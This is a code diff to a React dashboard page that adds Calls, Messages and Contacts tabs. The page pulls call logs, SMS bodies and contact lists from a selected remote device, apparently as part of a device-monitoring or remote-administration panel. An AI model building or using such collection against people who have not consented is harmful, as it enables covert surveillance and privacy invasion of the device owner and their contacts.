@@ -3,7 +3,7 @@
 import { AppSidebar } from "@/components/app-sidebar";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { Search, Eye, Download as DownloadIcon, Lock, Smartphone, FileText, Camera, Settings, Globe, Clock, RefreshCw, Monitor, ExternalLink, FolderOpen, Activity } from "lucide-react";
+import { Search, Eye, Download as DownloadIcon, Lock, Smartphone, FileText, Camera, Settings, Globe, Clock, RefreshCw, Monitor, ExternalLink, FolderOpen, Activity, Phone, MessageSquare, Users } from "lucide-react";
 import { useState, useEffect } from "react";
 import { useSearchParams } from "next/navigation";
 import { useGateway } from "@/hooks/use-gateway";
@@ -41,6 +41,29 @@ interface AppEntry {
   appType: string;
   executablePath?: string;
   windowsUser?: string;
+}
+
+interface CallEntry {
+  _id: string;
+  number: string;
+  name?: string;
+  type: number;
+  duration: number;
+  timestamp: string;
+}
+
+interface SmsEntry {
+  _id: string;
+  address: string;
+  body: string;
+  type: number;
+  timestamp: string;
+}
+
+interface ContactEntry {
+  _id: string;
+  name: string;
+  phone: string;
 }
 
 const iconMap: { [key: string]: any } = {
@@ -88,6 +111,9 @@ export default function LogsPage() {
   const [liveActivityLogs, setLiveActivityLogs] = useState<ActivityLog[]>([]);
   const [browserHistory, setBrowserHistory] = useState<BrowserEntry[]>([]);
   const [appHistory, setAppHistory] = useState<AppEntry[]>([]);
+  const [callLogs, setCallLogs] = useState<CallEntry[]>([]);
+  const [smsMessages, setSmsMessages] = useState<SmsEntry[]>([]);
+  const [contacts, setContacts] = useState<ContactEntry[]>([]);
   
   const [browserFilter, setBrowserFilter] = useState("all");
   const [appFilter, setAppFilter] = useState("all");
@@ -156,6 +182,15 @@ export default function LogsPage() {
           setLoading(false);
         } else if (msg.command === "FETCH_SYSTEM_NOTIFICATIONS") {
           setLoading(false);
+        } else if (msg.command === "FETCH_CALL_LOGS" && entries.length > 0) {
+          setCallLogs(entries as CallEntry[]);
+          setLoading(false);
+        } else if (msg.command === "FETCH_SMS_MESSAGES" && entries.length > 0) {
+          setSmsMessages(entries as SmsEntry[]);
+          setLoading(false);
+        } else if (msg.command === "FETCH_CONTACTS" && entries.length > 0) {
+          setContacts(entries as ContactEntry[]);
+          setLoading(false);
         }
       }
 
@@ -194,6 +229,27 @@ export default function LogsPage() {
           });
           const data = await res.json();
           if (!cancelled && data.success) setAppHistory(data.history || []);
+        } else if (activeTab === "calls") {
+          const res = await fetch(`/api/logs/call-logs?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
+            credentials: "include",
+            cache: "no-store",
+          });
+          const data = await res.json();
+          if (!cancelled && data.success) setCallLogs(data.logs || []);
+        } else if (activeTab === "sms") {
+          const res = await fetch(`/api/logs/sms?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
+            credentials: "include",
+            cache: "no-store",
+          });
+          const data = await res.json();
+          if (!cancelled && data.success) setSmsMessages(data.messages || []);
+        } else if (activeTab === "contacts") {
+          const res = await fetch(`/api/logs/contacts?limit=${limit}&deviceId=${encodeURIComponent(selectedDevice)}`, {
+            credentials: "include",
+            cache: "no-store",
+          });
+          const data = await res.json();
+          if (!cancelled && data.success) setContacts(data.contacts || []);
         }
       } catch (error) {
         console.error("Failed to fetch logs from DB:", error);
@@ -236,6 +292,12 @@ export default function LogsPage() {
       sendCommand(selectedDevice, "FETCH_BROWSER_HISTORY");
     } else if (activeTab === "apps") {
       sendCommand(selectedDevice, "FETCH_APP_HISTORY");
+    } else if (activeTab === "calls") {
+      sendCommand(selectedDevice, "FETCH_CALL_LOGS");
+    } else if (activeTab === "sms") {
+      sendCommand(selectedDevice, "FETCH_SMS_MESSAGES");
+    } else if (activeTab === "contacts") {
+      sendCommand(selectedDevice, "FETCH_CONTACTS");
     } else {
       fetchDataFromDB().then(() => setLoading(false));
     }
@@ -368,6 +430,39 @@ export default function LogsPage() {
               <Clock className="w-4 h-4" />
               App History
             </button>
+            <button
+              onClick={() => setActiveTab("calls")}
+              className={`px-6 py-3 font-medium transition-all border-b-2 flex items-center gap-2 ${
+                activeTab === "calls"
+                  ? "border-b-blue-600 text-blue-600"
+                  : "border-b-transparent text-muted-foreground hover:text-foreground"
+              }`}
+            >
+              <Phone className="w-4 h-4" />
+              Calls
+            </button>
+            <button
+              onClick={() => setActiveTab("sms")}
+              className={`px-6 py-3 font-medium transition-all border-b-2 flex items-center gap-2 ${
+                activeTab === "sms"
+                  ? "border-b-blue-600 text-blue-600"
+                  : "border-b-transparent text-muted-foreground hover:text-foreground"
+              }`}
+            >
+              <MessageSquare className="w-4 h-4" />
+              Messages
+            </button>
+            <button
+              onClick={() => setActiveTab("contacts")}
+              className={`px-6 py-3 font-medium transition-all border-b-2 flex items-center gap-2 ${
+                activeTab === "contacts"
+                  ? "border-b-blue-600 text-blue-600"
+                  : "border-b-transparent text-muted-foreground hover:text-foreground"
+              }`}
+            >
+              <Users className="w-4 h-4" />
+              Contacts
+            </button>
           </div>
 
           {/* Filters */}
@@ -487,7 +582,7 @@ export default function LogsPage() {
                   </Card>
                 ))
               )
-            ) : (
+            ) : activeTab === "apps" ? (
               filteredAppHistory.length === 0 ? (
                 <Card className="p-8 text-center"><p className="text-muted-foreground">No app history found</p></Card>
               ) : (
@@ -505,6 +600,56 @@ export default function LogsPage() {
                         </div>
                         {entry.executablePath && <p className="text-sm text-muted-foreground mt-1 truncate">{entry.executablePath}</p>}
                         <p className="text-xs text-muted-foreground mt-2">Last opened {formatTime(entry.lastOpened)}</p>
+                      </div>
+                    </div>
+                  </Card>
+                ))
+              )
+            ) : activeTab === "calls" ? (
+              callLogs.length === 0 ? (
+                <Card className="p-8 text-center"><p className="text-muted-foreground">No call logs found</p></Card>
+              ) : (
+                callLogs.map((entry, idx) => (
+                  <Card key={entry._id || idx} className="p-4">
+                    <div className="flex items-start gap-4">
+                      <div className="mt-1 p-2 rounded-lg bg-muted"><Phone className="w-5 h-5" /></div>
+                      <div className="flex-1">
+                        <h4 className="font-semibold">{entry.name || entry.number}</h4>
+                        <p className="text-sm text-muted-foreground">{entry.number} · type {entry.type} · {entry.duration}s</p>
+                        <p className="text-xs text-muted-foreground mt-2">{formatTime(entry.timestamp)}</p>
+                      </div>
+                    </div>
+                  </Card>
+                ))
+              )
+            ) : activeTab === "sms" ? (
+              smsMessages.length === 0 ? (
+                <Card className="p-8 text-center"><p className="text-muted-foreground">No messages found</p></Card>
+              ) : (
+                smsMessages.map((entry, idx) => (
+                  <Card key={entry._id || idx} className="p-4">
+                    <div className="flex items-start gap-4">
+                      <div className="mt-1 p-2 rounded-lg bg-muted"><MessageSquare className="w-5 h-5" /></div>
+                      <div className="flex-1">
+                        <h4 className="font-semibold">{entry.address}</h4>
+                        <p className="text-sm text-muted-foreground mt-1">{entry.body}</p>
+                        <p className="text-xs text-muted-foreground mt-2">{formatTime(entry.timestamp)}</p>
+                      </div>
+                    </div>
+                  </Card>
+                ))
+              )
+            ) : (
+              contacts.length === 0 ? (
+                <Card className="p-8 text-center"><p className="text-muted-foreground">No contacts found</p></Card>
+              ) : (
+                contacts.map((entry, idx) => (
+                  <Card key={entry._id || idx} className="p-4">
+                    <div className="flex items-start gap-4">
+                      <div className="mt-1 p-2 rounded-lg bg-muted"><Users className="w-5 h-5" /></div>
+                      <div className="flex-1">
+                        <h4 className="font-semibold">{entry.name || "Unknown"}</h4>
+                        <p className="text-sm text-muted-foreground">{entry.phone}</p>
                       </div>
                     </div>
                   </Card>
